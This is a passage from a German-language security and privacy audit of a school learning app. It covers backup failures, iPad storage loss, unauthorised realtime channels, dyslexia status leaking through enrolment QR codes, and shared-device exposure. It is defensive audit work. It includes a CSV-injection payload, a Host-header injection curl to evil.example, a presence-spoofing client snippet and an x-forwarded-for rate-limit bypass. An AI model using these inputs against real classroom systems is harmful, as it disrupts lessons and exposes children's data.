# Prüfinstanz B – Sicherheit, Datenschutz, Datenintegrität und Offline-Zuverlässigkeit

Gesamtaudit Lernraum, Commit `c30b916` (App-Version 0.8.0), Prüfdatum 20.10.2026.
Nur lesend geprüft. Reproduktionen liegen ausschließlich im Scratchpad
(`…/scratchpad/repro-b/`), nicht im Repository.

Leitfrage: Kann eine Grund- oder Mittelschule in Bayern Lernraum mit
Minderjährigen auf Schul-iPads betreiben, ohne dass Lerndaten verloren gehen,
sensible Informationen über Kinder abfließen oder Unterrichtsräume von außen
gestört werden? Kurzantwort: **Die Serverseite ist für ein Hobbyprojekt
auffällig sorgfältig. Die schwersten Lücken liegen aber an den Rändern:
Realtime-Kanäle ohne Autorisierung, eine Sicherung, die bei einer normalen
Funktion abbricht, keine Antwort auf die Speicherlöschung unter iPadOS,
LRS-Information im QR-Code, keine Trennung von Personen auf geteilten Geräten
und ein Rechtsrahmen, der laut eigenem Impressum noch gar keinen Echtbetrieb
erlaubt.**

---

## 1. Untersuchte Dateien

**Dokumentation (Konzept):** `docs/audits/2026-10-19-gesamtaudit/00-stand.md`,
`01-bestandsaufnahme.md`, `02-pruefauftraege.md`, `docs/security-risk-register.md`,
`docs/cloud-sync.md`, `docs/device-support.md`, `docs/laufdiktat-pilot-operations.md`,
`docs/umsetzungsplan-lernraum-ui.md` (Abschnitt 1.4), Vault
`obsidian-export/Lernplattform/12 …`, `13 …`, `14 …`, `16 …/Anwendung.md`,
`19 – Entscheidungsprotokoll` (Entscheidungen 1, 2, 3, 43, 52).

**Supabase:** alle 9 Migrationen unter `supabase/migrations/`, `supabase/config.toml`,
`tests/database-contract.test.mjs`.

**Live-Räume / Realtime:** `src/integrations/laufdiktat/live-room-client.ts`,
`room-api.ts`, `teacher-session.ts`, `teacher-results.ts`, `progress-delivery.ts`,
`app/components/live-room-join.tsx`, `app/components/background-room-presence.tsx`,
`app/lehrer/live/hooks/use-live-room-session.ts`, `app/lehrer/live/lib/participant-display.ts`,
`app/raum/spiel/live-game.tsx` (Ausschnitte), `app/raum/use-live-progress-delivery.ts`,
`src/domain/room-identity.ts`.

**Inhaltsübertragung / Krypto:** `src/integrations/content-transfer/crypto.ts`,
`content-transfer-client.ts`, `src/integrations/crypto/passphrase.ts`.

**Klasseneinschreibung:** `src/domain/class-enrollment.ts`, `class-seal.ts`,
`student-assignment.ts`, `teacher-workspace.ts` (HMAC-Leistungsbrief, Aufgaben-QR),
`app/components/teacher-class-configurator.tsx`, `student-class-enrollment.tsx`.

**Cloud-Abgleich:** `src/integrations/cloud-sync/session.ts`, `oauth.ts`,
`credentials.ts`, `envelope.ts`, `engine.ts`, `webdav.ts`, `google-identity.ts`,
`sync.ts`, `app/components/cloud-sync-setup.tsx`, `cloud-sync-panel.tsx`,
`app/sync/rueckkehr/*`.

**Web-Sicherheit:** `app/layout.tsx`, `app/components/math-display.tsx`, `proxy.ts`,
`worker/index.ts`, `next.config.ts`, `vite.config.ts`, `dist/client/_headers`.

**Offline/PWA:** `scripts/service-worker.template.js`, `scripts/generate-service-worker.mjs`,
`public/manifest.webmanifest`, `app/ui/service-worker-registration.tsx`,
`app/ui/update-toast.tsx`, `playwright.config.ts`, `e2e/installability.spec.ts`,
`e2e/math-practice.spec.ts`, `tests/rendered-html.test.mjs`.

**Lokale Daten/Sicherung:** `src/storage/backup-reminder.ts`, `personal-backup.ts`,
`personal-learning-events.ts` (Dexie-Schema, LernBox-Repository),
`src/domain/personal-backup.ts`, `src/domain/learning-box.ts`,
`app/components/student-settings-panel.tsx`, `app/views/lernbox/parts/home.tsx`,
`app/landing/install-button.tsx`.

**Datenschutz/Sprachausgabe:** `app/datenschutz/page.tsx`, `app/impressum/page.tsx`,
`src/speech/voices.ts`, `src/speech/speaker.ts`, `app/views/start/landing-screen.tsx`,
`app/lehrer/einstellungen/page.tsx`.

## 2. Ausgeführte Prüfungen (mit echten Ergebnissen)

| #   | Prüfung                                                                                                                                                       | Ergebnis                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       |
| --- | ------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| 1   | `node --test tests/database-contract.test.mjs` (vorhanden, PGlite)                                                                                            | 19/19 bestanden                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                |
| 2   | `npx vitest run` auf `envelope.test.ts`, `content-transfer/crypto.test.ts`, `class-seal.test.ts`, `pilot-security.test.ts`, `storage/personal-backup.test.ts` | 5 Dateien, 28 Tests bestanden                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  |
| 3   | Repro `repro-b/backup-folders.test.ts` (fake-indexeddb): Ordner + Stapel im Ordner anlegen, `serializePersonalLearningBackupFromDatabase`                     | **Export wirft `ZodError unrecognized_keys "folderId"`** (`src/domain/personal-backup.ts:157`) → B-001                                                                                                                                                                                                                                                                                                                                                                                                                         |
| 4   | Repro `repro-b/db-abuse.test.mjs` (PGlite, alle 9 Migrationen unverändert)                                                                                    | (a) 12 `open_room_secure` je Adresse, 13. blockiert; mit vorangestelltem frei gewähltem `x-forwarded-for`-Eintrag 40 weitere Räume ohne Sperre; ohne Header teilen alle den Schlüssel „unknown“. (b) Fremder mit Code liest alle `targetWord` (Lösungen), liest und **überschreibt** Station 2 (99 Fehler, `finished=true`, Fehlerwort `=HYPERLINK(...)`), Lehrkraft-RPC zeigt den gefälschten Stand. (c) 301 Transfer-Reservierungen von einer Adresse, 10-MiB-Upload angenommen, 0 Rate-Limit-Einträge → B-004, B-005, B-006 |
| 5   | Repro `repro-b/csv-injection.test.ts`                                                                                                                         | CSV-Zeilen beginnen mit `"=HYPERLINK(…)"`, `=1+1;3`, `"@SUM(1;2)"` → B-007 (Auswertung in Excel nicht geprüft)                                                                                                                                                                                                                                                                                                                                                                                                                 |
| 6   | Repro `repro-b/sync-downgrade.test.ts`                                                                                                                        | Gerät mit Passwortschlüssel übernimmt fremde **unverschlüsselte** Cloud-Datei: Status `idle`, Klassenname `MANIPULIERT`, danach wieder verschlüsselt hochgeladen → B-014                                                                                                                                                                                                                                                                                                                                                       |
| 7   | Repro `repro-b/lrs-qr.test.tsx` (QRCodeSVG wie im Code)                                                                                                       | Ohne Freigabe 316 Zeichen/61 Module, mit LRS-Freigabe 411 Zeichen/69 Module; Name, Klasse, Lehrkraft und Freigabe ohne Schlüssel lesbar → B-008                                                                                                                                                                                                                                                                                                                                                                                |
| 8   | Repro `repro-b/voices.test.ts` (nachgebildete Stimmenlisten von Edge/Chrome)                                                                                  | `pickVoice` wählt „Microsoft Katja Online (Natural)“ bzw. „Google Deutsch“ (beide `localService=false`) statt lokaler Stimme → B-012                                                                                                                                                                                                                                                                                                                                                                                           |
| 9   | Browser (Chromium 1194, eigener Proxy auf Port 3093 vor `vinext dev` :3002, Proxy danach abgeschaltet bzw. hängend)                                           | Besuchte Route `/frei/german` offline aus dem SW-Cache: funktioniert. Unbesuchte Routen `/lernen`, `/frei/mathematics`: SW liefert das HTML der Startseite (rohes `<h1>` „Dein Lernraum“), im Dev-Modus danach Fehlerseite „This page couldn’t load“. „Lie-Fi“ (Server antwortet nicht): Navigation lädt in 45 s nicht, kein Rückfall auf Cache → B-013                                                                                                                                                                        |
| 9a  | Erster Browserversuch mit `context.setOffline(true)`                                                                                                          | **verworfen**: Netzverkehr des Service Workers wurde nicht blockiert, Ergebnis nicht aussagekräftig                                                                                                                                                                                                                                                                                                                                                                                                                            |
| 10  | `curl -D -` gegen Dev-Server, Inspektion `dist/client/_headers`                                                                                               | Keine CSP, kein `frame-ancestors`/X-Frame-Options, kein HSTS, keine Referrer-/Permissions-Policy im Repository-Build; `_headers` enthält nur Cache-Control → B-015                                                                                                                                                                                                                                                                                                                                                             |
| 11  | `curl -H "X-Forwarded-Host: evil.example"` auf `/impressum`                                                                                                   | `og:image` = `https://evil.example/og.png` → B-021                                                                                                                                                                                                                                                                                                                                                                                                                                                                             |
| 12  | `npm audit --json` / `npm audit --omit=dev`                                                                                                                   | 10 Meldungen (7 hoch, 3 mittel, 0 kritisch), alle Build-/Lint-Kette; `--omit=dev`: 0 → B-022                                                                                                                                                                                                                                                                                                                                                                                                                                   |
| 13  | Webrecherche (WebSearch)                                                                                                                                      | WebKit 7-Tage-Regel, Supabase-Realtime-Autorisierung, Cloudflare-XFF-Verhalten, Supabase-Datenresidenz/DPF, Free-Tier-Pausierung, iOS-Speichertrennung; `gesetze-bayern.de` und `webkit.org` per WebFetch nicht erreichbar (DNS)                                                                                                                                                                                                                                                                                               |

## 3. Nicht untersuchte Bereiche

- **Produktivsysteme** (verboten): Supabase-Einstellungen (Realtime „Allow public
  access“, Gateway-Verhalten bei `x-forwarded-for`, Tarif/Pausierung, Backups,
  Log-Aufbewahrung, Region), Cloudflare-Dashboard (Header, HSTS, Logs, Access-Schutz),
  echte OAuth-Apps bei Microsoft/Google.
- **Echte iPads/Safari/WebKit**, MDM, Shared-iPad-Modus, privates Surfen: nur
  Code- und Literaturanalyse. Kein WebKit im Container.
- **Produktionsbuild offline**: Nur gegen `vinext dev` geprüft; Dev-Module
  verhalten sich anders als gehashte Produktionschunks.
- **Excel/Numbers/LibreOffice**: CSV-Formelauswertung nicht praktisch geprüft.
- Kein vollständiges Lesen der 38 836 Zeilen in `app/`; Tastenwelt, Häuser
  (`aus`), Duell (`aus`), KaTeX-Fuzzing, Interna von `qr-scanner`, Seitenkanäle
  bei Zeitmessung, Supabase-Realtime-Kontingente.
- **Rechtliche Bewertung**: Ich nenne Normen und offene Fragen, gebe aber keine
  Rechtsberatung. Bayerische Normtexte konnten online nicht abgerufen werden
  (Kennzeichnung „nicht online verifiziert“).

---

## 4. Befunde

Reihenfolge nach Schweregrad, innerhalb gleicher Stufe nach Reichweite.

### B-001 – Persönliche Sicherung bricht ab, sobald ein LernBox-Stapel in einem Ordner liegt

- **Bereich:** Datenintegrität / Sicherung (Schülergerät)
- **Status:** bestätigt (reproduziert)
- **Schweregrad:** P1
- **Sicherheit der Einschätzung:** hoch
- **Fundstelle:** `src/domain/personal-backup.ts:67-77` (`personalBackupDeckSchema`, `.strict()` ohne `folderId`), `src/storage/personal-backup.ts:103-126` (`exportPersonalLearningBackup`, `serializePersonalLearningBackupFromDatabase`); Aufrufer `app/components/student-settings-panel.tsx:211-232` (`download`), `src/integrations/backup/personal-backup-storage.ts:68` (Verzeichnis), `src/integrations/cloud-sync/sync.ts:20` (Schüler-Cloud „sichern“)
- **Beschreibung:** Seit es LernBox-Ordner gibt (Dexie v4, `learningBoxFolders`, UI in `app/views/lernbox/parts/manage.tsx` und `new-deck.tsx`), trägt ein Stapel im Ordner das Feld `folderId`. Das strikte Sicherungsschema kennt es nicht. **Jeder** Sicherungsweg (Datei, Verzeichnis, Schüler-Cloud) scheitert dann vollständig. Die Oberfläche meldet nur „Die Sicherung konnte nicht erstellt werden.“ Selbst wenn man `folderId` erlaubte, fehlt die Tabelle `learningBoxFolders` im Sicherungsumfang. Nach einer Wiederherstellung hätten die Stapel eine `folderId` ohne Ordner. Die Startseite zeigt nur Stapel ohne `folderId` oder solche in vorhandenen Ordnern (`home.tsx:17, 102-111`), solche Stapel wären also unsichtbar. Der getrennte LernBox-Export (`exportBackup`, `personal-learning-events.ts:528-532`) enthält Ordner, ist aber nicht die beworbene „Lernstand sichern“-Funktion.
- **Reproduktion / Prüfweg:** `repro-b/backup-folders.test.ts`: Ordner anlegen → Stapel mit `folderId` → `serializePersonalLearningBackupFromDatabase` → `ZodError [unrecognized_keys: folderId] at data.learningBoxDecks[0]`. Keine Testdatei im Repo deckt Ordner in der Sicherung ab (`grep folder` in Backup-Tests: kein Treffer).
- **Betroffene Nutzergruppen:** alle Kinder, die Ordner nutzen (z. B. „Buch Klasse 5“); damit auch deren Eltern/Lehrkräfte bei Gerätewechsel.
- **Mögliche Folgen:** Die einzige Absicherung gegen Speicherlöschung (siehe B-002) fällt still aus. Ein Kind sieht nur eine Fehlermeldung, die Erinnerung bleibt auf „nie gesichert“ oder veraltet, der gesamte Lernstand geht beim nächsten iPad-Reset verloren.
- **Empfehlung:** `folderId` und `learningBoxFolders` in Schema und Export aufnehmen (abwärtskompatibel mit `.default([])`). Wiederherstellung: verwaiste `folderId` entfernen. Einen Eigenschaftstest (fast-check) ergänzen, der beliebige gültige Repository-Zustände exportiert und wieder einliest („jede Tabelle der Dexie-Version ist im Export enthalten oder ausdrücklich ausgenommen“). Die Fehlermeldung sollte den Grund nennen.
- **Aufwand (grob):** S
- **Erfolgskriterium:** Round-Trip-Test mit Ordnern grün; ein Strukturtest scheitert, sobald eine neue Dexie-Tabelle oder ein neues Feld nicht im Sicherungsschema auftaucht.

### B-002 – Keine Antwort auf Speicherlöschung unter iPadOS/Safari; Sicherungserinnerung ist rein passiv

- **Bereich:** Zuverlässigkeit / Datenverlust
- **Status:** bestätigt (Codeanalyse) für das Fehlen von Maßnahmen; begründetes Risiko für das Plattformverhalten
- **Schweregrad:** P1
- **Sicherheit der Einschätzung:** mittel bis hoch (Plattformverhalten nicht auf Geräten geprüft)
- **Fundstelle:** fehlend im gesamten Code: `navigator.storage.persist()`, `persisted()`, `estimate()` (Suche ohne Treffer); `src/storage/backup-reminder.ts:1-44`; Anzeige nur in `app/components/student-settings-panel.tsx:296-303`; Installationshilfe `app/landing/install-button.tsx:8-27`
- **Beschreibung:** Alle Lernstände liegen in IndexedDB/localStorage. Diese Speicher können auf mehreren Wegen verschwinden, und keiner davon wird im Code oder in der Doku behandelt:
  1. **WebKit-7-Tage-Regel (ITP):** Bei nicht installierten Websites löscht Safari nach 7 Tagen Safari-Nutzung ohne Interaktion mit der Website den gesamten skriptbeschreibbaren Speicher (IndexedDB, LocalStorage, SW-Caches). Home-Bildschirm-Apps haben einen eigenen Zähler, der praktisch nicht abläuft. Ferien von 2+ Wochen bei weiter genutztem Safari reichen also aus.
  2. **Getrennte Speicher:** Eine zum Home-Bildschirm hinzugefügte Web-App hat unter iOS einen anderen Speichercontainer als Safari. Wer erst in Safari lernt und dann „Als App installieren“ folgt, startet mit leerem Lernraum. Die Installationsanleitung sagt das nicht.
  3. **Speicherdruck:** Ohne `persist()` darf der Browser die Origin bei Platzmangel räumen.
  4. **Privates Surfen, MDM-Profile mit Safari-Datenlöschung, Shared iPad / temporäre Sitzungen, „Verlauf und Websitedaten löschen“, Gerätetausch.**
     Die Erinnerung (`BACKUP_REMINDER_DAYS = 14`) erscheint nur, wenn das Kind „Profil und Einstellungen“ öffnet. Sie benachrichtigt nicht aktiv, und der Zeitstempel liegt im selben Speicher, der gelöscht wird. Eine Sicherung bedeutet auf dem iPad einen Datei-Download in die Dateien-App. Für Grundschulkinder auf verwalteten Geräten ist das kaum praktikabel. Der Plan `docs/umsetzungsplan-lernraum-ui.md:57-60` benennt „Behandlung von gelöschtem Speicher“ selbst als offen.
- **Reproduktion / Prüfweg:** Codesuche (`grep -rn "storage.persist\|persisted()\|navigator.storage"` → leer). Doku-Suche nach ITP/7 Tage/Home-Bildschirm-Speicher → nur Spiegelschrift-Treffer. Plattformverhalten: Literatur (Quellen unten), nicht auf echtem iPad nachgestellt.
- **Betroffene Nutzergruppen:** alle Kinder, besonders auf iPads in Safari (nicht installiert), auf geteilten/verwalteten Geräten und nach Ferien.
- **Mögliche Folgen:** Kompletter Verlust von Lernhistorie, Leitner-Ständen, Wortspeicher und Klassenmitgliedschaft (inkl. LRS-Freigabe). Lernstand und Motivation des Kindes sind dann weg, und die adaptive Wiederholung verliert ihre Grundlage.
- **Empfehlung:** (1) `navigator.storage.persist()` nach erster Lernaktivität anfordern, Ergebnis und `estimate()` anzeigen. (2) Beim Start einen „Speicher-Kanarienvogel“ prüfen: Ist eine Kennung weg, die vorher da war, ist der Speicher gelöscht worden. Dann eine erklärende Seite mit Wiederherstellung zeigen. (3) Unter iPadOS ausdrücklich die Home-Bildschirm-Installation **vor** dem ersten Lernen empfehlen und auf die getrennten Speicher hinweisen. (4) Die Erinnerung aktiv auf der Lernen-Startseite zeigen. (5) Mittelfristig eine schulseitige Sicherung ohne Kinderkonto anbieten, z. B. einen QR-/Dateiexport, den die Lehrkraft einsammelt (datenschutzrechtlich prüfen). (6) Die Doku `device-support.md` um ein Kapitel „Speicherlebensdauer“ ergänzen.
- **Aufwand (grob):** M
- **Erfolgskriterium:** Auf einem echten iPad (Safari und Home-Bildschirm) belegt ein Testprotokoll: `persisted()` ist `true` oder es gibt einen Hinweis, gelöschter Speicher wird erkannt, die Installationsanleitung warnt vor dem Speicherwechsel.

### B-003 – Realtime-Kanäle ohne Autorisierung: Präsenz fälschen, Angriffe senden, mithören

- **Bereich:** Sicherheit Live-Raum (Supabase Realtime)
- **Status:** bestätigt (Codeanalyse); nicht gegen Produktion ausgeführt (verboten)
- **Schweregrad:** P1
- **Sicherheit der Einschätzung:** hoch (Code); mittel für die Produktionskonfiguration
- **Fundstelle:** `app/components/live-room-join.tsx:177-179` (öffentlicher Kanal `room-${code}`, kein `private: true`), `:285-294`, `:303-336` (`student-progress`/`student-finished` ungeprüft in `roster`/`peers`), `:337-347` (`request-progress`), `:348-367` (`attack` ungeprüft), `:496-512` (Broadcast enthält `...progress` inkl. `wordErrors`), `:530-546` (`sendAttack`); `app/lehrer/live/hooks/use-live-room-session.ts:297-323` (Präsenzschlüssel → `presenceNames`), `:361-368` (`connectedNames`/`allNames` enthalten Präsenzschlüssel), `:461-474` (CSV mit `allNames`); `app/lehrer/live/lib/participant-display.ts:6-17` (unbekannter Schlüssel wird wörtlich angezeigt); `app/components/background-room-presence.tsx:32-46`; keine Policy auf `realtime.messages` in den Migrationen
- **Beschreibung:** Das Kanalthema hängt nur am vierstelligen Code. Der Publishable Key steht im ausgelieferten Bundle. Laut Supabase-Doku braucht Autorisierung private Kanäle (`private: true`), RLS-Policies auf `realtime.messages` und das Abschalten von „Allow public access“. Nichts davon ist umgesetzt, die App _muss_ daher mit öffentlichem Zugang laufen. Ein Fremder braucht weder `join_room_secure` noch Rate-Limit noch das 90-Minuten-Fenster. Er kann:
  1. **Präsenz fälschen:** Beliebige Schlüssel (auch Beleidigungen) erscheinen in der Teilnehmerliste der Lehrkraft, oft am Beamer, als „online“. Sie landen in der Ergebnis-CSV (siehe B-007). „Entfernen“ wirkt nur auf DB-Teilnehmer, gegen reine Präsenz-Einträge hilft es nicht.
  2. **Battle stören:** `attack` an jedes Kind senden (Tinte/Flimmern je 15 s). Die Zielnamen (`participant-…`) liest er aus den öffentlichen `student-progress`-Broadcasts mit.
  3. **Mithören:** Fortschritt, Fehlerzahlen und Fehlerwörter aller Kinder (pseudonym mit Tier) in allen aktiven Räumen; Raumsuche durch Abonnieren der 10 000 Themen.
  4. **Weckrufe:** `session-start`/`session-ended`/`request-progress`. Positiv: Start und Ende lösen nur einen autorisierten RPC-Abgleich aus (`syncAuthorizedRoomState`), Inhalte kommen nie über Broadcast. Gefälschtes `session-ended` beendet aber die „übt weiter“-Präsenz (`background-room-presence.tsx:44-47`). `request-progress` lässt alle Geräte erneut senden.
  5. **Nebeneffekt Codewiederverwendung:** Codes sind nur unter nicht beendeten Räumen eindeutig. Ein Kind, dessen alter Raum endete, ohne dass es das Signal bekam, meldet sich bis zu 45 min als „übt weiter“ im Kanal eines fremden neuen Raums mit gleichem Code.
- **Reproduktion / Prüfweg:** Codepfad oben. Prüfweg für die Hauptinstanz in einer Testumgebung (nicht Produktion): zweiter Client mit `createClient(url, key).channel("room-1234", {config:{presence:{key:"TEST"}}}).subscribe(s => s==="SUBSCRIBED" && ch.track({}))` → Name erscheint im Lehrer-Dashboard. Supabase-Doku zur Realtime-Autorisierung (Quellen unten).
- **Betroffene Nutzergruppen:** Lehrkräfte (Beamer-Anzeige, CSV), alle Kinder im Raum (Störungen, Mitlesen von Fehlern).
- **Mögliche Folgen:** Störung des Unterrichts ohne Zurechenbarkeit, Bloßstellung durch eingeschleuste Namen vor der Klasse, Mitlesen pseudonymer Leistungsdaten, verfälschte Ergebnislisten. Ein neugieriger Mittelschüler mit der Browser-Konsole reicht dafür.
- **Empfehlung:** Private Kanäle mit RLS auf `realtime.messages`. Da es keine Supabase-Auth gibt: (a) anonyme Supabase-Auth-Sitzungen, deren Teilnahme `join_room_secure` in einer Tabelle bindet, und eine Policy, die Thema und Raum-ID gegen diese Tabelle prüft; oder (b) Realtime nur noch als inhaltsleeres Wecksignal nutzen, mit nicht erratbarem Thema (Raum-UUID statt Code), und alles Weitere per RPC. Präsenz für die Lehreransicht nur aus `room_participants` ableiten (`touch_participant_secure` existiert schon), Präsenzschlüssel nie anzeigen oder exportieren. `attack` nur annehmen, wenn `from` ein bekannter Teilnehmer ist, und Angriffe serverseitig (RPC) vermitteln. Broadcasts ohne `wordErrors`.
- **Aufwand (grob):** M (Variante b) bis L (Variante a)
- **Erfolgskriterium:** Ein Client ohne gültigen Teilnehmertoken kann den Raumkanal nicht abonnieren (Testumgebung). Die Lehrerliste zeigt nur serverseitig registrierte Teilnehmer. Ein E2E-Test mit gefälschtem Präsenzclient bleibt ohne Wirkung.

### B-008 – LRS-Freigabe im Einschreibe-QR lesbar und am QR sichtbar

- **Bereich:** Datenschutz (sensible Information über Kinder)
- **Status:** bestätigt (reproduziert)
- **Schweregrad:** P1
- **Sicherheit der Einschätzung:** hoch (technisch); rechtliche Einordnung offen
- **Fundstelle:** `src/domain/class-enrollment.ts:150-221` (`encodeEnrollmentV3`, Flag `4` = Freigabe in Z. 166-174, Klartextfelder Name/Klasse/Lehrkraft), `:477-490` (`createEnrollmentLink`, Code im URL-Fragment); `app/components/teacher-class-configurator.tsx:618-623` (`size={member.writingRelief ? 280 : 220}`), `:380-394` (QR-Bogen mit Namen)
- **Beschreibung:** Der Einschreibe-QR enthält Klarnamen, Klasse, Lehrkraft, Schuljahr, das 128-Bit-`enrollmentToken` und bei Schreiberleichterung die signierte Freigabe. Wer den Code scannt (Kamera-App, Foto des Bogens, Blick über die Schulter), kann ihn ohne Schlüssel dekodieren: base64url, Bit 4 im ersten Byte. Schon die **Größe** verrät den Status. Der Code mit Freigabe hat 69 statt 61 Modulen und wird in der Einzelansicht bewusst größer gezeigt (280 statt 220 px). Auf einem projizierten oder gedruckten Bogen ist der Unterschied sichtbar. Der Link landet beim Öffnen im Safari-Verlauf des Geräts (Fragment). Die Aussage in Vault 13 und SR-002 („Server, Raum und andere Geräte erfahren weder … noch LRS-Status“) stimmt für Server und Raum. Sie stimmt nicht für Menschen, die den QR sehen.
- **Reproduktion / Prüfweg:** `repro-b/lrs-qr.test.tsx` → `{lenMia:316, lenBen:411, modulesMia:61, modulesBen:69, readableWithoutKey:{name:"Ben Muster", class:"Klasse 4a", teacher:"Frau Beispiel", writingRelief:true}}`.
- **Betroffene Nutzergruppen:** Kinder mit Lese-Rechtschreib-Störung/-Schwäche und deren Eltern; Lehrkräfte als Verarbeitende.
- **Mögliche Folgen:** Mitschüler oder Dritte erfahren von einer Lernstörung. Das kann stigmatisieren. Je nach Einordnung handelt es sich um Gesundheitsdaten (Art. 9 DSGVO). Laut § 36 BaySchO genügt für den LRS-Nachweis eine schulpsychologische Stellungnahme (Suchtreffer gesetze-bayern.de; Wortlaut nicht online verifiziert).
- **Empfehlung:** (1) Kurzfristig: einheitliche QR-Größe. Einheitliche Nutzlast: immer eine signierte Aussage mitsenden, mit `true` oder `false`, gleiche Länge. Kein visueller Unterschied auf dem Bogen. (2) Den QR-Bogen als vertrauliches Dokument kennzeichnen und eine Druck-/Vernichtungsanleitung beigeben. (3) Mittelfristig die Freigabe aus dem dauerhaft ausgedruckten Einschreibe-QR herauslösen: eigener, kurzlebiger Freigabe-QR, den nur das Kind sieht, oder Freigabe nur im Live-Raum, verschlüsselt mit dem `enrollmentToken`. (4) Die Datenschutzfolgen in Verzeichnis/DSFA aufnehmen (siehe B-011).
- **Aufwand (grob):** S (1–2), M (3)
- **Erfolgskriterium:** Codes mit und ohne Freigabe sind gleich lang und gleich groß. Ein Test prüft die Längengleichheit. Die Dokumentation beschreibt die verbleibende Offenlegung ehrlich.

### B-009 – Lehrerdaten ohne Zugriffsschutz auf geteilten Geräten; „Lehrer-Login“ täuscht Schutz vor

- **Bereich:** Datenschutz / Rollen (Entscheidung 43)
- **Status:** bestätigt (Codeanalyse)
- **Schweregrad:** P1
- **Sicherheit der Einschätzung:** hoch
- **Fundstelle:** `app/views/start/landing-screen.tsx:68` (Link „Lehrer-Login“ auf der Schülerstartseite); `app/lehrer/*` ohne jede Sperre; Hinweis nur in `app/lehrer/einstellungen/page.tsx:10-14`, nicht in `app/lehrer/klassen`; `app/components/cloud-sync-setup.tsx:162, 267, 552-554` („Andere nutzen dieses Gerät“ steuert nur das Merken des Schlüssels); `docs/cloud-sync.md` („Unterricht an der digitalen Tafel auf Gerät B“)
- **Beschreibung:** Entscheidung 43 stellt „Gerät/Browserprofil = Schutzgrenze“ auf und verlangt, dass die Navigation „Lehrerbereich“ statt „Lehrer-Login“ heißt. Die Schülerstartseite bietet trotzdem „Lehrer-Login“ an. Das verspricht einen Schutz, den es nicht gibt. Gleichzeitig ist der beworbene Anwendungsfall des Geräte-Abgleichs die **Tafel im Klassenzimmer**, also ein typisch geteiltes Gerät, das Kinder bedienen, wenn sie an die Tafel kommen. Wer dort `/lehrer/klassen` öffnet, sieht Klarnamen, LRS-Haken, Leistungsbriefe und Einschreibe-QRs. Er kann Freigaben ausstellen, wenn Schlüssel synchronisiert sind, und Daten exportieren oder löschen. Die Option „geteiltes Gerät“ verhindert nur das Merken des Passworts, nicht das Ablegen der entschlüsselten Daten in IndexedDB. Dasselbe gilt, wenn die Lehrkraft auf einem Schul-iPad aus dem Klassensatz vorbereitet.
- **Reproduktion / Prüfweg:** Startseite → „Lehrer-Login“ → `/lehrer` öffnet sich ohne Abfrage (im Browserlauf gesehen). Codepfade oben.
- **Betroffene Nutzergruppen:** Kinder (Daten über sie), Lehrkräfte (Verantwortung), Schulleitung.
- **Mögliche Folgen:** Kinder erfahren Namen, LRS-Status und Ergebnisse anderer Kinder. Datenverlust oder Manipulation durch Löschen und Importieren. Verletzung der Vertraulichkeit nach Art. 32 DSGVO.
- **Empfehlung:** (1) Sofort: Beschriftung „Lehrerbereich“. Den Schutzhinweis auf jeder Lehrerseite mit Personendaten zeigen. Personenbezogene Bereiche (Schülerliste, Ergebnisse, Schlüssel) standardmäßig nur auf Geräten anbieten, die die Lehrkraft ausdrücklich als „persönlich“ markiert hat. (2) Kurzfristig: eine lokale App-Sperre (PIN/Passkey über WebAuthn) für den Lehrerbereich. Lehrerdaten auf dem Gerät mit dem Abgleich-Schlüssel verschlüsseln und nur nach Entsperren entschlüsseln (die Krypto-Bausteine existieren). (3) Für Tafeln einen Modus „nur Material“: Abgleich ohne Schülerliste und ohne Ergebnisse, erzwungen, wenn „geteilt“ gewählt ist.
- **Aufwand (grob):** S (1), M (2–3)
- **Erfolgskriterium:** Auf einem als „geteilt“ markierten Gerät liegen keine Schülernamen/LRS-Daten im Klartext in IndexedDB (Test). Der Lehrerbereich mit Personendaten verlangt eine Entsperrung.

### B-010 – Schülergeräte: keine Trennung mehrerer Kinder, kein Profilwechsel, kein Löschen

- **Bereich:** Datenschutz / Zuverlässigkeit
- **Status:** bestätigt (Codeanalyse); Tragweite hängt von der Geräteausstattung ab (offene Frage)
- **Schweregrad:** P1 bei geteilten iPads (Klassensatz/Koffer), P2 bei 1:1-Ausstattung
- **Sicherheit der Einschätzung:** hoch
- **Fundstelle:** eine Datenbank je Origin (`src/storage/personal-learning-events.ts:71-156`, `student-classes.ts:12-20`), Profil in `localStorage` (`src/storage/learner-profile.ts`), keine Funktion „Profil wechseln“, „abmelden“ oder „alle Daten löschen“ (Suche ohne Treffer); `app/components/student-class-enrollment.tsx:213` zeigt `displayName`; offen benannt in `docs/umsetzungsplan-lernraum-ui.md:61`
- **Beschreibung:** Das Modell lautet „ein Browserprofil = ein Kind“. Auf iPads aus dem Klassensatz übernimmt das nächste Kind den Lernraum des vorigen: Fehlerliste, Wortspeicher, Tier, Klassenmitgliedschaft mit Klarnamen und LRS-Freigabe (die dann für das falsche Kind wirkt), Aufgaben. Ein Kind kann seine Daten nicht selbst löschen. Es bleibt nur „Websitedaten löschen“ in den iPad-Einstellungen, was oft per MDM gesperrt ist. Der Plan benennt das Problem selbst, umgesetzt ist es nicht.
- **Reproduktion / Prüfweg:** Codesuche; Ablauf: Kind A schreibt sich ein → Kind B öffnet auf demselben Gerät „Klasse“ → sieht „… · Mia Muster“.
- **Betroffene Nutzergruppen:** Grundschulen mit geteilten Geräten (in Bayern verbreitet; Annahme, nicht verifiziert), Kinder mit LRS-Freigabe.
- **Mögliche Folgen:** Gegenseitige Einsicht in Fehler und Lernstände, falsche Zuordnung von Lernständen, LRS-Toleranz für das falsche Kind, keine praktikable Umsetzung des Löschrechts.
- **Empfehlung:** Mehrere lokale Profile je Gerät (eigene Dexie-Datenbank je Profil, Wahl über Tier und Bild ohne Klarnamen, optional mit Bild-PIN). „Gerät freigeben“: Profil abmelden und dabei optional Sicherung anstoßen. „Meine Daten löschen“. Klare Aussage in `device-support.md`, ob geteilte Geräte unterstützt werden.
- **Aufwand (grob):** L
- **Erfolgskriterium:** E2E-Test: zwei Profile auf einem Gerät sehen sich gegenseitig nicht. Löschen entfernt alle Tabellen eines Profils.

### B-011 – Rechtsrahmen: Echtbetrieb mit Kindern ohne AVV, Verzeichnis, DSFA, Freigabe; Datenschutzerklärung unvollständig und teils falsch

- **Bereich:** Datenschutz-Compliance (bayerischer Schulkontext)
- **Status:** bestätigt (Dokumenten- und Codeanalyse); rechtliche Bewertung offene Frage
